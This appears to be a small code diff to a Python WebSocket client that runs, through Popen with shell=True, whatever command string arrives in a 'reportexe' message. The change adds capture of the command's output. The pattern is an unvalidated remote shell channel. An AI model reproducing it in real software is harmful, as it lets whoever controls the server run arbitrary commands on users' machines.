@@ -83,7 +83,7 @@ class Client(WebSocketClient):
                 print (msg['type'])
             if msg['type'] == 'reportexe':
                 #print("Command received:  " + msg['content'] + "at "+strftime("%Y-%m-%d %H:%M:%S", gmtime()))
-                p = Popen([msg['content']], stdin=PIPE, shell=True)
+                p = Popen([msg['content']], stdin=PIPE,stdout=PIPE, shell=True)
                 (output, err) = p.communicate()
                 print("Command executed successfully")
                 
